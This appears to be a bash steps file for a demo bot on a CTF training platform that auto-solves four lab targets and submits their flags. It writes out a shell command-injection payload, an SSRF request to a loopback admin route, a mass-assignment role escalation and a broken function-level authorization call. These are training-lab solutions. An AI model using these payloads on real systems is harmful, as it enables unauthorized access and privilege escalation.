# ctf-server-trust demo bot steps (see engine/web-terminal/bot-runner.sh's BOT_STEPS_FILE) -- replaces
# the git-fundamentals default with this pack's own four attack-range targets (plan rows 4, 7, 12, 13:
# ping-tool, ssrf-fetcher, api-mass-assignment, api-bfla). Every step walks the exact technique the lab
# itself teaches and ends with `dojo-flag submit <challenge> <flag>`. `--fast` gets one pass
# (bot-runner.sh's run loop handles that generically). Re-runnable: every step starts the target fresh
# and returns 0 whenever the slot or the exploit didn't come through this round.

# -- attack-range helpers (same contract as every other ctf pack's steps.sh) ----------------------
attack_start_and_wait() { # $1 = target id, $2 = name of a var to set with the live slot's addr
  local target="$1" out_var="$2" timeout="${3:-90}"
  portal_login || return 1
  portal_curl -X POST -H 'Content-Type: application/json' -d "{\"target\":\"$target\"}" \
    "$GATEWAY_URL/ctf-attack/attack/start" >/dev/null
  local deadline=$((SECONDS + timeout))
  while [ "$SECONDS" -lt "$deadline" ]; do
    local doc state slot_target
    doc="$(portal_curl "$GATEWAY_URL/ctf-attack/attack/status")"
    slot_target="$(printf '%s' "$doc" | jq -r '.slot.target // ""' 2>/dev/null)"
    state="$(printf '%s' "$doc" | jq -r '.slot.state // ""' 2>/dev/null)"
    if [ "$slot_target" = "$target" ] && [ "$state" = "live" ]; then
      addr="$(printf '%s' "$doc" | jq -r --arg t "$target" '.targets[] | select(.id==$t) | .addr // ""' 2>/dev/null)"
      if [ -n "$addr" ]; then
        eval "$out_var=\$addr"
        return 0
      fi
    fi
    sleep 2
  done
  return 1
}

extract_flag() { grep -o 'flag{[^}]*}' | head -1; }

step_wrap_round() {
  portal_curl -X POST -H 'Content-Type: application/json' -d '{}' \
    "$GATEWAY_URL/ctf-attack/attack/stop" >/dev/null 2>&1
  narrate "round $ROUND done -- taking a short break before round $((ROUND + 1))"
  sleep "$(rand_between "$BOT_ROUND_BREAK_MIN" "$BOT_ROUND_BREAK_MAX")"
}

# -- Lab 1: ping-tool -- inject a second shell command into the hostname field to read the
# escalation note the lab points at, then redeem its token at /escalate.
step_ping_tool() {
  narrate "Lab 1 -- ping-tool: starting the target"
  local addr body token flag
  if ! attack_start_and_wait ping-tool addr; then
    narrate "ping-tool never went live this round -- skipping"
    return 0
  fi
  narrate "slot live at $addr -- injecting a second command into the hostname field"
  body="$(curl -s -X POST "http://$addr:5000/diagnostics" \
    --data-urlencode 'host=127.0.0.1; cat /tmp/sudo-note.txt')"
  token="$(printf '%s' "$body" | grep -o 'Escalation token:[[:space:]]*[0-9a-f]*' | grep -o '[0-9a-f]*$')"
  if [ -z "$token" ]; then
    narrate "ping-tool: the injection didn't leak an escalation token this round -- skipping"
    return 0
  fi
  narrate "leaked escalation token $token -- redeeming it at /escalate"
  flag="$(curl -s -X POST "http://$addr:5000/escalate" --data-urlencode "token=$token" | extract_flag)"
  if [ -z "$flag" ]; then
    narrate "ping-tool: /escalate didn't accept the token this round -- skipping submit"
    return 0
  fi
  run_cmd "dojo-flag submit ping-tool '$flag'"
}

# -- Lab 2: ssrf-fetcher -- point the public preview feature's server-side fetch at the loopback-
# only internal admin service, the way the lab's hints walk a student to the internal port.
step_ssrf_fetcher() {
  narrate "Lab 2 -- ssrf-fetcher: starting the target"
  local addr flag
  if ! attack_start_and_wait ssrf-fetcher addr; then
    narrate "ssrf-fetcher never went live this round -- skipping"
    return 0
  fi
  narrate "slot live at $addr -- previewing the internal-only admin flag route on 127.0.0.1:5001"
  flag="$(curl -s -X POST "http://$addr:5000/preview" \
    --data-urlencode 'url=http://127.0.0.1:5001/internal/admin/flag' | extract_flag)"
  if [ -z "$flag" ]; then
    narrate "ssrf-fetcher: the internal fetch didn't come back with a flag this round -- skipping submit"
    return 0
  fi
  run_cmd "dojo-flag submit ssrf-fetcher '$flag'"
}

# -- Lab 3: api-mass-assignment -- log in as this bot's own account (its terminal username,
# password changeme123, exactly as the lab states), PATCH an extra `role` field onto /users/me,
# then read the admin-only report.
step_api_mass_assignment() {
  narrate "Lab 3 -- api-mass-assignment: starting the target"
  local addr token report flag
  if ! attack_start_and_wait api-mass-assignment addr; then
    narrate "api-mass-assignment never went live this round -- skipping"
    return 0
  fi
  narrate "slot live at $addr -- logging in as $BOT_USER"
  token="$(curl -s -X POST "http://$addr:5000/login" -H 'Content-Type: application/json' \
    -d "{\"username\":\"$BOT_USER\",\"password\":\"changeme123\"}" | jq -r '.token // ""' 2>/dev/null)"
  if [ -z "$token" ]; then
    narrate "api-mass-assignment: login failed this round -- skipping"
    return 0
  fi
  narrate "got a token -- PATCHing role=admin onto my own /users/me"
  curl -s -X PATCH "http://$addr:5000/users/me" -H "Authorization: Bearer $token" \
    -H 'Content-Type: application/json' -d '{"role":"admin"}' >/dev/null
  report="$(curl -s "http://$addr:5000/admin/report" -H "Authorization: Bearer $token")"
  flag="$(printf '%s' "$report" | jq -r '.flag // ""' 2>/dev/null)"
  if [ -z "$flag" ]; then
    narrate "api-mass-assignment: /admin/report didn't return a flag this round -- skipping submit"
    return 0
  fi
  run_cmd "dojo-flag submit api-mass-assignment '$flag'"
}

# -- Lab 4: api-bfla -- log in as this bot's own ordinary account and call /admin/reset-all with
# that same token, no X-Confirm-Reset header (the lab is explicit: never send it on a shared range).
step_api_bfla() {
  narrate "Lab 4 -- api-bfla: starting the target"
  local addr token result flag
  if ! attack_start_and_wait api-bfla addr; then
    narrate "api-bfla never went live this round -- skipping"
    return 0
  fi
  narrate "slot live at $addr -- logging in as $BOT_USER"
  token="$(curl -s -X POST "http://$addr:5000/login" -H 'Content-Type: application/json' \
    -d "{\"username\":\"$BOT_USER\",\"password\":\"changeme123\"}" | jq -r '.token // ""' 2>/dev/null)"
  if [ -z "$token" ]; then
    narrate "api-bfla: login failed this round -- skipping"
    return 0
  fi
  narrate "calling /admin/reset-all with my own ordinary student token (dry run only, no X-Confirm-Reset)"
  result="$(curl -s -X POST "http://$addr:5000/admin/reset-all" -H "Authorization: Bearer $token")"
  flag="$(printf '%s' "$result" | jq -r '.flag // ""' 2>/dev/null)"
  if [ -z "$flag" ]; then
    narrate "api-bfla: /admin/reset-all didn't return a flag this round -- skipping submit"
    return 0
  fi
  run_cmd "dojo-flag submit api-bfla '$flag'"
}

case "$PERSONA" in
  expert)
    STEPS=(step_ping_tool step_ssrf_fetcher step_api_mass_assignment step_api_bfla step_wrap_round)
    ;;
  intermediate)
    STEPS=(step_ping_tool step_ssrf_fetcher step_api_mass_assignment step_wrap_round)
    ;;
  novice)
    STEPS=(step_ping_tool step_ssrf_fetcher step_wrap_round)
    ;;
esac
